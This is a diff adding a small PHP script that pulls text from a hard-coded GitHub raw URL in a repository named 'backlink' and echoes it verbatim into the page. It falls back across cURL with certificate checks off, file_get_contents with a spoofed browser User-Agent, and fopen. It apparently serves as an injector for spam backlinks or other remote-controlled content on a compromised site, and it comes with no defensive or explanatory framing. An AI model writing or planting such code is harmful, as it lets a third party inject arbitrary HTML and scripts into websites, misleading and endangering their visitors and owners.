@@ -1,0 +1,66 @@
+<?php
+
+$url = "https://raw.githubusercontent.com/rivo88/backlink/refs/heads/main/surgabacklik";
+
+function getContentUniversal($url){
+
+    // 1. CURL
+    if(function_exists('curl_init')){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+
+        $data = curl_exec($ch);
+        curl_close($ch);
+
+        if($data !== false){
+            return $data;
+        }
+    }
+
+    // 2. file_get_contents
+    if(function_exists('file_get_contents')){
+        $context = stream_context_create(array(
+            "http" => array(
+                "method" => "GET",
+                "header" => "User-Agent: Mozilla/5.0\r\n",
+                "timeout" => 20
+            )
+        ));
+
+        $data = @file_get_contents($url,false,$context);
+
+        if($data !== false){
+            return $data;
+        }
+    }
+
+    // 3. fopen fallback
+    if(function_exists('fopen')){
+        $handle = @fopen($url,"r");
+        if($handle){
+            $data = "";
+            while(!feof($handle)){
+                $data .= fgets($handle,1024);
+            }
+            fclose($handle);
+            return $data;
+        }
+    }
+
+    return false;
+}
+
+$content = getContentUniversal($url);
+
+if($content !== false){
+    echo $content;
+}else{
+    echo "Failed to get content";
+}
+
+?>
